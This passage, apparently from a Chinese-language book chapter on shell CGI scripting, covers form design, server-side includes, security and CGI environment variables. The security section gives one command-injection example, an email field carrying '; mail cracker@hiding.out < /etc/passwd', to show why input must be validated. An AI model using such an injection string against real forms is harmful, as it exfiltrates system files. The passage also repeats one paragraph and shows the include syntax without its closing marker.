
习惯上（但并非必须）使用 `.shtml` 扩展名命名带有服务器端包含的文档，并配置 Web 服务器软件，使服务器对所有此类扩展名的文件进行活动解析。在这种情况下，`.html` 扩展名的文件将不经解释直接传输给客户端。

## 设计考虑

客户端 CGI 为 Web 页面开发者提供了一系列丰富的表单元素。正如我们在随后的章节中看到的，服务器端 CGI 提供了同样丰富的网关和数据处理能力。

然而，拥有良好的工具并不自动意味着它们会被良好地使用。为了让您的 Web 页面发挥作用，您必须注意一些设计和编码考虑。

幸运的是，对于大多数 Web 客户端（浏览器），您可以通过将 HTML 文件加载到浏览器程序中并在创建时查看表单。这将允许您在没有现成编程服务器的情况下检查页面并尝试设计方法。

以下是创建包含表单的精美且易用的 Web 页面的的一些指南和提示：

- 首先在您的网站上规划信息流的逻辑视图。哪些输入和输出对象应该彼此靠近？哪些信息应该分组在另一个表单或另一个页面上？
- 一旦确定了顺畅的信息流，就为您的网站选择“外观和感受”。这会是非常业务化的吗？还是亮丽夺目的？还是充满了下载需要时间的丰富图片？
- 选择合适外观和感受的最佳方法是考虑您的 Web 网站主要受众的需求和兴趣。这里是他们经常检索或输入信息的地方吗？如果是，请确保页面不拥乱，并且他们可以在无需通过 Tab 键跳过许多可选字段的情况下完成核心输入，这些可选字段可以放在次要的表单或页面上，以便在需要时调用。
- 另一方面，如果您的网站必须吸引路人的注意，请选择设计元素（如图形），以便在页面开始加载时就能传递您的信息。
- 一致性是屏幕和表单设计中的重要因素。选择几种颜色、字体和背景。将所有文本字段、按钮和复选框的标签放在相同的相对位置。使用 HTML 标签对齐标签和框，这样用户的眼睛就不需要为了跟踪信息流而在屏幕上来回跳跃。
- 确保通过表单的导航路径与相应的信息流并行。通常情况下，按照信息自然呈现的顺序对字段进行分组；例如，将姓名、地址和电话放在表单的同一个区域。
- 节省屏幕空间，但不要以牺牲可读性为代价。调整下拉菜单、选择框和 `textarea` 的大小，使其显示部分（但不必是全部）选项或输入文本。
- 选择输入字段类型时要考虑易用性。当用户必须从长长的选项列表中选择时，请使用下拉菜单。为了允许他们从较短的列表中选择数量变化的选项，请使用复选框。将单选按钮留给很少从默认值改变的几个选项之间的切换。
- 在适当的情况下，定义默认值，以便您的用户可以通过 Tab 键快速浏览完表单。
- 在编写客户端 CGI 时，注意服务器端的情况。特别是避免在表单字段中使用 UNIX 或 CGI 变量名。如果您的 CGI 程序将访问正式数据库，也避免使用数据库字段名。

## 使用 CGI

当您访问 Web 页面时（通过指定 URL 或点击另一个页面中的链接），服务器会使用提供的路径并为您的浏览器检索该内容。当您的浏览器请求图像、声音文件或其他文件时，也会发生相同的情况。当所需项目是静态的或接近静态的时（例如度假照片或您最喜欢的 10 位老师列表），简单的 HTML 文件是一个简单的方法。

但如果数据是动态的，可以从一个页面动态创建 HTML 作为输出，然后在另一个页面的框架内执行它。这是在 Web 网站中嵌入动态 HTML 的一种有些笨拙的方法，但有时很有用。

服务器端包含的语法如下：

```
<!--#include virtual="/yourfilestring/here"
```

在检索和传输基础 HTML 文档时，服务器会遇到这一行，并将指定文件的内容插入到文档的该位置。

这种技术给服务器系统增加了额外负担。在大多数情况下，这种影响微乎其微；但在繁忙的系统或包含文件非常大的情况下，解释包含的 HTML 所需资源可能会影响服务器性能。

习惯上（但并非必须）使用 `.shtml` 扩展名命名带有服务器端包含的文档，并配置 Web 服务器软件，使服务器对所有此类扩展名的文件进行活动解析。在这种情况下，`.html` 扩展名的文件将不经解释直接传输给客户端。

## 安全问题

您必须仔细编写脚本以防止输入数据被执行。您必须验证输入数据的大小、格式和有效性。如果您期望将电子邮件地址作为输入（并用它向该地址发送邮件），您必须确保它是一个电子邮件地址。如果用户输入正确的电子邮件地址，一切运行正常。但如果她决定故意找麻烦，并将电子邮件地址输入为：

```
myname@myaddress.com ; mail cracker@hiding.out < /etc/passwd
```

那么您的密码文件已被发送到 `cracker@hiding.out`。

编写程序时要尽可能保持警惕，特别是当这些程序将能够从互联网访问时。互联网正变成一个日益糟糕的社区，人们会试图利用你的程序来做些坏事。简单地假设自己不会成为攻击目标是愚蠢的。

不要创建那些对于没有运行最新测试版浏览器（该浏览器实现了大量专有功能）的人来说完全无用的程序。虽然某个特定的浏览器使用率可能高到让你能够覆盖大部分受众，但请记住，世界上还有人使用的浏览器无法显示框架（frames），他们的视力受损到必须使用纯文本浏览器，还有人处于过滤了 JavaScript 的防火墙之后。

互联网的建立是为了连接人们，让每个人都能交流思想。不要构建违背互联网整体精神并阻碍人们使用资源的专有系统。构建利用某些浏览器类型、使用框架（frames）等功能以及高度图形化用户界面的 CGI 应用程序（或静态 HTML 页面！）本身并没有什么错，但如果你这样做了，请确保你构建应用程序的方式能让那些没有这些功能的人也能使用它们。示例包括：在不支持框架的浏览器显示的页面部分，不要只写一句“去下载一个支持框架的浏览器”，而是提供页面的纯文本版本，或者在 `<IMG>` 标签上使用 `ALT` 参数，以便在不使用图像的情况下也能进行导航。

遵循这些简单的准则可以防止你无谓地限制受众、阻碍程序的实用性，并损害使用程序的人的隐私。

## Shell 脚本可用的数据

用任何其他语言编写的 CGI 脚本都可以访问许多环境变量和其他数据源。这些变量和值随客户端所使用的 Web 服务器和 Web 浏览器而异。

表 17.1 显示了 CGI 脚本可用的常用环境变量。这些是除了 Shell 本身可能提供的普通变量之外的。

**表 17.1 环境变量。**

| 变量 | 描述 |
| :--- | :--- |
| `AUTH_TYPE` | 用户身份验证类型（如果使用） |
| `CONTENT_LENGTH` | 数据的大小（字节） |
| `CONTENT_TYPE` | 附加数据的内容类型（用于 `PUT` 和 `POST`） |
| `GATEWAY_INTERFACE` | 服务器支持的 CGI 规范版本 |
| `HTTP_ACCEPT` | 客户端浏览器接受的 MIME 类型，以逗号分隔的形式：类型/子类型，类型2/子类型 |
| `HTTP_CONNECTION` | 连接类型（例如 "Keep-Alive"） |
| `HTTP_HOST` | 服务器的 DNS 名称，可能是一个别名 |
| `HTTP_REFERER` | 指向此 CGI 脚本的链接来源（位置） |
| `HTTP_USER_AGENT` | 客户端浏览器的软件名称/版本 |
| `PATH_INFO` | 关于脚本路径的信息（位置） |
